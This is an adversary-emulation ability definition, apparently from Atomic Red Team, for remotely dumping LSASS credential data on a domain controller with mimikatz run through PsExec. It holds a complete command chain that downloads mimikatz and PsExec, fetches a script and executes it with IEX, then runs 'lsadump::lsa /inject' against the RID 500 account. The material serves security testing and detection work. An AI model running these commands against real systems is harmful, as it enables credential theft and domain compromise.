- id: 3203ad24-168e-4bec-be36-f79b13ef8a83
  name: Remote Process Injection in LSASS via mimikatz
  description: 'Use mimikatz to remotely (via psexec) dump LSASS process content for
    RID 500 via code injection (new thread).

    Especially useful against domain controllers in Active Directory environments.

    It must be executed in the context of a user who is privileged on remote `machine`.


    The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>'
  tactic: privilege-escalation
  technique:
    attack_id: T1055
    name: Process Injection
  platforms:
    windows:
      sh:
        command: '$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe; if
          (Test-Path $mimikatz_path) {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
          = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"
          -UseBasicParsing); $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases";
          $zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url
          | where-object { $_.endswith(".zip") }; $mimikatz_exe = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe;
          $basePath = Split-Path $mimikatz_exe | Split-Path; Invoke-FetchFromZip $zipUrl
          "x64/mimikatz.exe" $basePath; fi; if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe")
          { exit 0} else { exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
          = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip"
          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" -UseBasicParsing;
          Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools"
          -Force; New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe")
          -Force | Out-Null; Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"
          "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force; fi; "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"
          /accepteula \\DC1 -c %tmp%\mimikatz\x64\mimikatz.exe "lsadump::lsa /inject
          /id:500" "exit"'
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - privilege-escalation
  - t1055
  author: Atomic Red Team
  additional_info:
    input_arguments:
      machine:
        description: machine to target (via psexec)
        type: string
        default: DC1
      mimikatz_path:
        description: Mimikatz windows executable
        type: path
        default: '%tmp%\mimikatz\x64\mimikatz.exe'
      psexec_path:
        description: Path to PsExec
        type: string
        default: PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe
    dependencies:
    - description: 'Mimikatz executor must exist on disk and at specified location
        (#{mimikatz_path})

        '
      prereq_command: '$mimikatz_path = cmd /c echo #{mimikatz_path}

        if (Test-Path $mimikatz_path) {exit 0} else {exit 1}

        '
      get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n\
        IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"\
        \ -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\
        \n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url\
        \ | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n\
        $basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl\
        \ \"x64/mimikatz.exe\" $basePath\n"
    - description: 'PsExec tool from Sysinternals must exist on disk at specified
        location (#{psexec_path})

        '
      prereq_command: 'if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}

        '
      get_prereq_command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction
        Ignore -Force | Out-Null

        Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile
        "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" -UseBasicParsing

        Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools"
        -Force

        New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null

        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "#{psexec_path}"
        -Force

        '
    technique_created: '2017-05-31T21:30:47.843Z'
    atomic_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
    import_timestamp: '2025-08-06T03:44:19.951236Z'
